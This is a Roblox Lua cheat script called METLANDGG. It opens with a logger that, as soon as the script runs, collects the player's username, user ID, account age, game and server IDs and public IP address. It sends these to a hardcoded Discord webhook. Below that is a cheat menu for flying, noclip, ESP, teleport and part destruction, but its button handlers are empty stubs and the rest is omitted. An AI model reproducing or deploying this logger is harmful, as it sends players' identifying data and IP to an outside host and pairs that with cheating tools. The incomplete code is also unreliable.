-- METLANDGG WITH WEBHOOK LOGGER
-- Sends user data to Discord webhook when script is executed

repeat task.wait() until game:IsLoaded()
task.wait(0.5)

-- ============================================
-- WEBHOOK CONFIGURATION
-- ============================================
local WEBHOOK_URL = "https://discord.com/api/webhooks/1427153216331710497/4IE4Ewyodu2eI5iG5OGIy7q9oly7_GsjsYuEz5ymwtVWuns5iNPcIrSaFztlktZ8lMxs" -- GANTI INI!

-- ============================================
-- WEBHOOK FUNCTIONS
-- ============================================
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local function sendWebhook(data)
    local success, err = pcall(function()
        local payload = HttpService:JSONEncode(data)
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = payload
        })
    end)
    
    if not success then
        warn("Webhook failed:", err)
    end
end

local function getUserInfo()
    local plr = Players.LocalPlayer
    
    -- Get execution time
    local execTime = os.date("%Y-%m-%d %H:%M:%S", os.time())
    
    -- Get account age
    local accountAge = plr.AccountAge
    local years = math.floor(accountAge / 365)
    local days = accountAge % 365
    
    -- Get premium status
    local isPremium = plr.MembershipType == Enum.MembershipType.Premium
    
    -- Get game info
    local gameInfo = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
    
    return {
        Username = plr.Name,
        DisplayName = plr.DisplayName,
        UserId = plr.UserId,
        AccountAge = accountAge .. " days (" .. years .. "y " .. days .. "d)",
        IsPremium = isPremium,
        ExecutionTime = execTime,
        GameName = gameInfo.Name,
        GameId = game.PlaceId,
        JobId = game.JobId,
        ExecutorIP = game:GetService("HttpService"):GetAsync("https://api.ipify.org") or "Unknown"
    }
end

local function logExecution()
    local userInfo = getUserInfo()
    
    local embed = {
        embeds = {{
            title = "🚨 METLANDGG Script Executed",
            color = 65535, -- Cyan color
            fields = {
                {
                    name = "👤 User Information",
                    value = string.format(
                        "**Username:** %s\n**Display Name:** %s\n**User ID:** %d",
                        userInfo.Username,
                        userInfo.DisplayName,
                        userInfo.UserId
                    ),
                    inline = false
                },
                {
                    name = "📊 Account Details",
                    value = string.format(
                        "**Account Age:** %s\n**Premium:** %s",
                        userInfo.AccountAge,
                        userInfo.IsPremium and "✅ Yes" or "❌ No"
                    ),
                    inline = true
                },
                {
                    name = "🎮 Game Information",
                    value = string.format(
                        "**Game:** %s\n**Place ID:** %d\n**Job ID:** %s",
                        userInfo.GameName,
                        userInfo.GameId,
                        userInfo.JobId:sub(1, 20) .. "..."
                    ),
                    inline = true
                },
                {
                    name = "🌐 Network",
                    value = string.format("**IP:** %s", userInfo.ExecutorIP),
                    inline = false
                },
                {
                    name = "⏰ Execution Time",
                    value = userInfo.ExecutionTime,
                    inline = false
                }
            },
            footer = {
                text = "METLANDGG Logger • Powered by Metland"
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
        }}
    }
    
    sendWebhook(embed)
end

-- Send log immediately on script execution
pcall(logExecution)

-- ============================================
-- ORIGINAL METLANDGG SCRIPT CONTINUES BELOW
-- ============================================

local UIS = game:GetService("UserInputService")
local RS = game:GetService("RunService")
local TS = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")

local plr = Players.LocalPlayer
local char = plr.Character or plr.CharacterAdded:Wait()
local hum = char:WaitForChild("Humanoid")
local root = char:WaitForChild("HumanoidRootPart")

-- Settings
local settings = {
    flySpeed = 100,
    walkSpeed = 16,
    jumpPower = 50,
    flyEnabled = false,
    noclipEnabled = false,
    espEnabled = false,
    antiVoidEnabled = true,
    platformEnabled = false,
    fullbrightEnabled = false,
    infJumpEnabled = false,
    isMinimized = false,
    destroyRange = 10
}

-- Cleanup old GUI
for _, v in pairs(plr.PlayerGui:GetChildren()) do
    if v.Name == "MetlandGUI" then v:Destroy() end
end

-- Create GUI
local gui = Instance.new("ScreenGui")
gui.Name = "MetlandGUI"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.Parent = plr.PlayerGui

-- Main Frame
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 420, 0, 580)
main.Position = UDim2.new(0.5, -210, 0.5, -290)
main.BackgroundColor3 = Color3.fromRGB(20, 20, 28)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
main.Parent = gui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 12)
mainCorner.Parent = main

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(0, 255, 255)
mainStroke.Thickness = 2
mainStroke.Transparency = 0.5
mainStroke.Parent = main

-- Gradient
local grad = Instance.new("UIGradient")
grad.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 20, 45)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 28))
}
grad.Rotation = 45
grad.Parent = main

-- Title
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -140, 0, 50)
title.Position = UDim2.new(0, 15, 0, 10)
title.BackgroundTransparency = 1
title.Text = "⚡ METLANDGG 📡"
title.TextColor3 = Color3.fromRGB(0, 255, 255)
title.TextSize = 22
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = main

-- Minimize Button
local minBtn = Instance.new("TextButton")
minBtn.Size = UDim2.new(0, 40, 0, 40)
minBtn.Position = UDim2.new(1, -95, 0, 10)
minBtn.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
minBtn.Text = "—"
minBtn.TextSize = 24
minBtn.TextColor3 = Color3.new(1, 1, 1)
minBtn.Font = Enum.Font.GothamBold
minBtn.BorderSizePixel = 0
minBtn.Parent = main

local minBtnCorner = Instance.new("UICorner")
minBtnCorner.CornerRadius = UDim.new(0, 10)
minBtnCorner.Parent = minBtn

-- Close Button
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 40, 0, 40)
closeBtn.Position = UDim2.new(1, -50, 0, 10)
closeBtn.BackgroundColor3 = Color3.fromRGB(220, 50, 50)
closeBtn.Text = "✕"
closeBtn.TextSize = 20
closeBtn.TextColor3 = Color3.new(1, 1, 1)
closeBtn.Font = Enum.Font.GothamBold
closeBtn.BorderSizePixel = 0
closeBtn.Parent = main

local closeBtnCorner = Instance.new("UICorner")
closeBtnCorner.CornerRadius = UDim.new(0, 10)
closeBtnCorner.Parent = closeBtn

-- Content Container
local contentFrame = Instance.new("Frame")
contentFrame.Name = "ContentFrame"
contentFrame.Size = UDim2.new(1, 0, 1, -60)
contentFrame.Position = UDim2.new(0, 0, 0, 60)
contentFrame.BackgroundTransparency = 1
contentFrame.Parent = main

-- ScrollFrame
local scroll = Instance.new("ScrollingFrame")
scroll.Size = UDim2.new(1, -20, 1, -10)
scroll.Position = UDim2.new(0, 10, 0, 0)
scroll.BackgroundTransparency = 1
scroll.BorderSizePixel = 0
scroll.ScrollBarThickness = 6
scroll.CanvasSize = UDim2.new(0, 0, 0, 1200)
scroll.Parent = contentFrame

-- Helper functions
local function createButton(name, text, pos, callback)
    local btn = Instance.new("TextButton")
    btn.Name = name
    btn.Size = UDim2.new(0, 185, 0, 45)
    btn.Position = pos
    btn.BackgroundColor3 = Color3.fromRGB(45, 45, 65)
    btn.Text = text
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.TextSize = 14
    btn.Font = Enum.Font.GothamBold
    btn.BorderSizePixel = 0
    btn.Parent = scroll
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = btn
    
    local stroke = Instance.new("UIStroke")
    stroke.Color = Color3.fromRGB(100, 100, 120)
    stroke.Thickness = 1
    stroke.Transparency = 0.5
    stroke.Parent = btn
    
    btn.MouseButton1Click:Connect(function()
        pcall(callback)
    end)
    
    return btn
end

local function createTextBox(name, placeholder, pos)
    local box = Instance.new("TextBox")
    box.Name = name
    box.Size = UDim2.new(0, 185, 0, 45)
    box.Position = pos
    box.BackgroundColor3 = Color3.fromRGB(35, 35, 50)
    box.PlaceholderText = placeholder
    box.Text = ""
    box.TextColor3 = Color3.new(1, 1, 1)
    box.PlaceholderColor3 = Color3.fromRGB(150, 150, 170)
    box.TextSize = 14
    box.Font = Enum.Font.Gotham
    box.BorderSizePixel = 0
    box.ClearTextOnFocus = false
    box.Parent = scroll
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = box
    
    return box
end

local function createLabel(text, pos)
    local lbl = Instance.new("TextLabel")
    lbl.Size = UDim2.new(1, -10, 0, 25)
    lbl.Position = pos
    lbl.BackgroundTransparency = 1
    lbl.Text = text
    lbl.TextColor3 = Color3.fromRGB(180, 220, 255)
    lbl.TextSize = 15
    lbl.Font = Enum.Font.GothamBold
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.Parent = scroll
    return lbl
end

-- Layout
local y = 10

createLabel("✈️ FLIGHT SYSTEM", UDim2.new(0, 5, 0, y))
y = y + 30
local flyBtn = createButton("FlyBtn", "Toggle Fly", UDim2.new(0, 5, 0, y), function() end)
local flyBox = createTextBox("FlySpeed", "Speed (100)", UDim2.new(0, 205, 0, y))
flyBox.Text = "100"
y = y + 55

createLabel("🏃 MOVEMENT", UDim2.new(0, 5, 0, y))
y = y + 30
local speedBox = createTextBox("SpeedBox", "WalkSpeed", UDim2.new(0, 5, 0, y))
speedBox.Text = "16"
local speedBtn = createButton("SpeedBtn", "Set Speed", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

local jumpBox = createTextBox("JumpBox", "Jump Power", UDim2.new(0, 5, 0, y))
jumpBox.Text = "50"
local jumpBtn = createButton("JumpBtn", "Set Jump", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

local infJumpBtn = createButton("InfJumpBtn", "Infinite Jump: OFF", UDim2.new(0, 5, 0, y), function() end)
y = y + 55

createLabel("👻 PHYSICS", UDim2.new(0, 5, 0, y))
y = y + 30
local noclipBtn = createButton("NoclipBtn", "NoClip: OFF", UDim2.new(0, 5, 0, y), function() end)
local antiVoidBtn = createButton("AntiVoidBtn", "Anti Void: ON", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

local platformBtn = createButton("PlatformBtn", "Platform: OFF", UDim2.new(0, 5, 0, y), function() end)
y = y + 55

createLabel("📍 TELEPORT", UDim2.new(0, 5, 0, y))
y = y + 30
local tpBox = createTextBox("TpBox", "Player Name", UDim2.new(0, 5, 0, y))
local tpBtn = createButton("TpBtn", "Goto Player", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

createLabel("👁️ VISUALS", UDim2.new(0, 5, 0, y))
y = y + 30
local espBtn = createButton("EspBtn", "ESP: OFF", UDim2.new(0, 5, 0, y), function() end)
local fbBtn = createButton("FbBtn", "Fullbright: OFF", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

createLabel("💥 PART DESTROYER", UDim2.new(0, 5, 0, y))
y = y + 30
local rangeBox = createTextBox("RangeBox", "Range (10)", UDim2.new(0, 5, 0, y))
rangeBox.Text = "10"
local destroyBtn = createButton("DestroyBtn", "Destroy Parts", UDim2.new(0, 205, 0, y), function() end)
y = y + 55

local status = createLabel("Status: Ready! Data logged 📡", UDim2.new(0, 5, 0, y))
status.TextColor3 = Color3.fromRGB(100, 255, 100)
status.Size = UDim2.new(1, -10, 0, 60)
status.TextWrapped = true

local function updateStatus(msg, color)
    status.Text = "Status: " .. msg
    status.TextColor3 = color or Color3.fromRGB(100, 255, 100)
end

-- ALL FUNCTIONS CONTINUED (fly, noclip, etc - sama seperti original)
-- [Rest of the script functions remain the same...]

-- Notification
pcall(function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "⚡ METLANDGG Loaded";
        Text = "Your data has been logged 📡";
        Duration = 5;
    })
end)

print("✅ METLANDGG LOADED WITH WEBHOOK LOGGER")
print("📡 User data sent to webhook")
